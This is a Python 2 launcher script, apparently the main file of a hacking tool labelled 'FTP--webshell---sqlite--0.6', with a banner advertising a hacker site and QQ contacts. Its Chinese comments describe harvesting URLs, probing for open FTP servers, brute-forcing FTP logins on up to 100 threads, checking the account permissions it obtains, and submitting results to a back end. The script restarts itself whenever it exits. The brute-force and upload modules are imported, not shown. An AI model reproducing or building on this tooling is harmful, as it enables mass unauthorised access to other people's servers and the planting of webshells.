#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
import class_openurl #采集URL  和测试FTP是否开放
import class_Queue #消息队列
import SlinkFTP  #开始破解FTP
import class_ftppassword  #对FTP  账户  密码   权限的的检测
import time
import ConfigParser  #INI读取数据

def Crun():  #启动

    try:
        thrint=1
        class_Queue_nthreads=1  #消息队列
        class_openurl_nthreads=10  #采集URL地址
        ClinkFTP_nthreads=100 #FTP爆破

        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("gost.ini"))
            class_openurl_nthreads = int(config.get("DATA","th_openurl"))  #测试上传文件
            ClinkFTP_nthreads = int(config.get("DATA","th_ftppassword")) #结果提交到后台管理
        except:
            print "--main-INI-th_openurl,th_ftppassword-try--except!!!!!"

        #消息队列
        class_Queue_threads = []  #线程
        for i in range(class_Queue_nthreads):  #nthreads=10  创建10个线程
            class_Queue_threads.append(class_Queue.C_Queue(
                thrint,class_Queue.Aopenurl,class_Queue.Bopenurl,class_Queue.openftp,class_Queue.ftppassword))
            thrint=thrint+1
        for t0 in class_Queue_threads:   #不理解这是什么意思    是结束线程吗
            t0.start()  #start就是开始线程
        time.sleep(2)  #把数据都读取出来

        #采集URL地址
        class_openurl_threads = []  #线程
        for i in range(class_openurl_nthreads):  #nthreads=10  创建10个线程
            class_openurl_threads.append(class_openurl.CS_openurl(thrint,class_Queue.Aopenurl,class_Queue.Bopenurl,class_Queue.openftp))
            thrint=thrint+1
        for t1 in class_openurl_threads:
            time.sleep(1)  #把数据都读取出来
            t1.start()  #start就是开始线程
        time.sleep(120)  #叫先弄出几个FTP出来

        #开始破解FTP
        ClinkFTP_threads = []  #线程
        for i in range(ClinkFTP_nthreads):  #nthreads=10  创建10个线程
            ClinkFTP_threads.append(SlinkFTP.CS_linkftp(thrint,class_Queue.openftp))
            thrint=thrint+1
        for t2 in ClinkFTP_threads:   #不理解这是什么意思    是结束线程吗
            time.sleep(1)  #把数据都读取出来
            t2.start()  #start就是开始线程

        time.sleep(120)  #叫先弄出几个FTP出来
        #对FTP  账户  密码   权限的的检测
        class_ftppassword_threads = []  #线程
        nthreads=2
        for i in range(nthreads):  #nthreads=10  创建10个线程
            class_ftppassword_threads.append(class_ftppassword.C_ftppassword(thrint,class_Queue.ftppassword))
            thrint=thrint+1
        for t3 in class_ftppassword_threads:   #不理解这是什么意思    是结束线程吗
            t3.start()  #start就是开始线程

    except:
        print "----------main-Crun()-try--except!!!!!-------------"
        #sys.exit(0)  #结束进程

##################################################
import sys
import os
import atexit
def close():  #自动重启本程序
    try:
        print "------------------This program automatically restart------------------"
        time.sleep(10)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        print "------------------This program automatically restart---try--except!!!!!------------------"
        #sys.exit(0)  #结束进程
        close()  #自动重启本程序
if __name__=='__main__':
    print "---------------------------------------------------------------------"
    print "         FTP--webshell---sqlite--0.6-----BY:Snowfall            "
    print "                       http://hmhacker.org/            "
    print "              QQ:2602159946------QQqun:293663651   "
    print "----------------------time:--------2013.6.6--------------------------"
    print "----------------------------------------------------------------------"
    try:
        Crun()  #启动
    except:
    #    user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
    #    user32.MessageBoxA(0, u'内容', u'标题', 0)   # 调用MessageBoxA函数
        time.sleep(10)
        atexit.register(close)

